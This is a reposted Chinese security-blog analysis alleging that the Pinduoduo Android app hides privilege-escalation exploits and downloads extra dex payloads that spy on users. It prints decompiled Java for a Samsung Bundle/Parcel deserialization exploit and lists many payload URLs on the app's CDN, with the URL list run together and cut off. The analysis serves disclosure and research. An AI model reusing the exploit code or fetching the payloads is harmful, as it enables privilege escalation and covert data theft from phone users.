---
title: 【鸿钧情报】PDD内嵌提权代码，及动态下发dex
url: https://buaq.net/go-152744.html
source: unSafe.sh - 不安全
date: 2023-03-10
fetch_date: 2025-10-04T09:05:33.339729
---

# 【鸿钧情报】PDD内嵌提权代码，及动态下发dex

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

【鸿钧情报】PDD内嵌提权代码，及动态下发dex

参考「 深蓝洞察 」的文章：https://mp.weixin.qq.com/s/P\_EYQxOEupqdU0BJMRqWsw（Bundle 风水 - Android Parcel 序列化与反序列化不
*2023-3-9 19:43:55
Author: [mp.weixin.qq.com(查看原文)](/jump-152744.htm)
阅读量:269
收藏*

---

参考「 深蓝洞察 」的文章：

```
https://mp.weixin.qq.com/s/P_EYQxOEupqdU0BJMRqWsw
```

（Bundle 风水 - Android Parcel 序列化与反序列化不匹配系列漏洞，实现 0day/Nday 攻击，从而绕过系统校验，获取系统级 StartAnyWhere 能力）

复现流程如下：

```
https://com-xunmeng-pinduoduo.en.uptodown.com/android/download/91472728
```

解压apk文件，找到拼多多apk中，提权代码所在的文件位置：

```
pinduoduo-6-49-0.zip\assets\component\com.xunmeng.pinduoduo.AliveBaseAbility.7z\com.xunmeng.pinduoduo.AliveBaseAbility\vmp_src\mw1.bin
```

以上是一个加VMP壳的dex文件，脱壳还原出代码，可以找到针对不同手机厂商系统的多个用于提权的漏洞利用代码，胆子相当的大，比如利用三星手机“com.samsung.android.cepproxyks.CertByte”的提权漏洞，代码如下：

```
// assets/component/com.xunmeng.pinduoduo.AliveBaseAbilitiy// [Manwei]// com/xunmeng/pinduoduo/android_pull_ablity_comp/pullstartup/SamsungAlivePullStartup
Public static Bundle makeBundleForSamsungSinceP(Intent intent){   Bundle bundle = new Bundle();   Parcel obtain = Parcel.obtain();   Parcel obtain2 = Parcel.obtain();   Parcel obtain3 = Parcel.obtain();   obtain2.writeInt(3);   obtain2.writeInt(13);   obtain2.writeInt(72);   obtain2.writeInt(3);   obtain2.writeInt(0);   obtain2.writeInt(0);   obtain2.writeInt(0);   obtain2.writeInt(0);   obtain2.writeInt(0);   obtain2.writeInt(4);   obtain2.writeString("com.samsung.android.cepproxyks.CertByte");   obtain2.writeInt(0);   byte b[] = new byte[0];   obtain2.writeByteArray(b);   obtain2.writeInt(0);   obtain2.writeInt(13);   obtain2.writeInt(72);   obtain2.writeInt(53);   obtain2.writeInt(0);   obtain2.writeInt(0);   obtain2.writeInt(0);   obtain2.writeInt(0);   obtain2.writeInt(0);   obtain2.writeInt(1);   obtain2.writeInt(1);   obtain2.writeInt(13);   obtain2.writeInt(72);   obtain2.writeInt(48);   obtain2.writeInt(0);   obtain2.writeInt(0);   obtain2.writeInt(0);   obtain2.writeInt(0);   obtain2.writeInt(0);   obtain2.writeInt(13);   obtain2.writeInt(-1);   int dataPosition = obtain2.dataPosition();   obtain2.writeString("intent");   obtain2.writeInt(4);   obtain2.writeString("android.content.Intent");   obtain2.writeToParcel(obtain3, 0);   obtain2.appendFrom(obtain3, 0, obtain3.dataSize());   int dataPosition2 = obtain2.dataPosition();   obtain2.setDataPosition(dataPosition2 - 4);   obtain2.writeInit(dataPosition2 -dataPosition);   obtain2.setdataPosition(dataPosition2);   int dataSize = obtain2.dataSize();   obtain.writeInt(dataSize);   obtain.writeInt(1279544898);   obtain.appendFrom(obtain2, 0, dataSize);   obtain.setDataPosition(0);   bundle.readFromParcel(obtain);   return bundle;}
```

提权后，就开始瞎搞了，动态下发dex，开始给自己保活，防卸载，然后搞数据，这部分代码比较通俗易懂， 比如：

```
1a68d982e02fc22b464693a06f528fac.dex
```

读取用户手机上的app使用记录

```
95cd95ab4d694ad8bdf49f07e3599fb3.dex
```

读取用户手机的应用通知，这一波各大公司app全灭了吧？

自己去dex目录看吧。

部分dex文件的下载地址（3月3日已被拼多多从CDN服务器上删除）：

```
https://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/dex/f4247da0-6274-44eb-859a-b4c35ec0dd71.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/45783d15-9f56-43a7-b3c7-930872f91c9b.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/45783d15-9f56-43a7-b3c7-930872f91c9b.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/45783d15-9f56-43a7-b3c7-930872f91c9b.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/4a72c6bb-337c-46c4-8c9c-637efafdd1c6.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/61517b68-7c09-4021-9aaa-cdebeb9549f2.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/78afc1cd-60da-482b-90e7-4d5e72a01266.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/dynamic/f9b6b139-4516-4ac2-896d-8bc3eb1f2d03.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/6932a923-9f13-4624-bfea-1249ddfd5505.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/7c6e6702-e461-4315-8631-eee246aeba95.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/8c34f5dc-f04c-40ba-98d4-7aa7c364b65c.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/a3937709-b9cc-48fd-8918-163c9cb7c2df.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/a4d4dccf-1f8c-48e3-acd5-92cdf156e585.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/hw/e9ded9d4-1c94-47d0-8e8b-94aa773af81c.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/4569a29c-b5a8-4dcf-a3a6-0a2f0bfdd493.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/538278f3-9f68-4fce-be10-12635b9640b2.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/75dcc8ea-d0f9-4222-b8dd-2a83444f9cd6.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/7c3507cc-c1a7-4c97-bfa3-e70b938d8f07.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/7c3507cc-c1a7-4c97-bfa3-e70b938d8f07.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/7ce6d296-a5bd-4718-9f79-543621ba5422.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/e723d560-c2ee-461e-b2a1-96f85b614f2b.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/oppo/f0139a82-8bb6-4f3e-a81b-70200fc38eaa.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/sdlog/218a37ea-710d-49cb-b872-2a47a1115c69.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/136d4651-df47-41b4-bb80-2ec0ab1bc775.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/4f260398-e9d1-4390-bbb9-eeb49c07bf3c.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/7dee63bd-ebad-4d74-a06f-90750aa18e18.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/8b56d820-cac2-4ca0-8a3a-1083c5cca7ae.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/vivo/cdcbd06b-8a32-4645-b9fe-c186b548c34e.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/xm/5d372522-b6a4-4c1b-a0b4-8114d342e6c0.dexhttps://commfile.pddpic.com/galerie-go/spirit/sd1000/xm/74168acd-14b4-4ff8-842e-f92b794d7abf.dexhttps://commfile.pddpic.com/sdfile/common/1a68d982e02fc22b464693a06f528fac.dexhttps://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dexhttps://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dexhttps://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dexhttps://commfile.pddpic.com/sdfile/common/35604479f8854b5d90bc800e912034fc.dexhttps://commfile.pddpic.com/sdfile/common/561341f5f7976e13efce7491887f1306.dexhttps://commfile.pddpic.com/sdfile/common/6afc90e406bf46e4a29956aabcdfe004.dexhttps://commfile.pddpic.com/sdfile/common/6afc90e406bf46e4a29956aabcdfe004.dexhttps://commfile.pddpic.com/sdfile/common/6f9451e79a0a4b53aff86fe489dffd22.dexhttps://commfile.pddpic.com/sdfile/common/98f10c20525142f9929b4f267b6ccf4d.dexhttps://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dexhttps://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dexhttps://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dexhttps://commfile.pddpic.com/sdfile/common/b50477f70bd14479a50e6fa34e18b2a0.dexhttps://commfile.pddpic.com/sdfile/common/cab85f8e4487412483ee00c2ecf06737.dexhttps://commfile.pddpic.com/sdfile/common/cab85f8e4487412483ee00c2ecf06737.dexhttps://commfile.pddpic.com/sdfile/common/d4b6d58467fb417380d53382b8adcfd6.dexhttps://commfile.pddpic.com/sdfile/common/da60112a4b2848adba2ac11f412cccc7.dexhttps://commfile.pddpic.com/sdfile/common/da60112a4b2848adba2ac11f412cccc7.dexhttps://commfile.pddpic...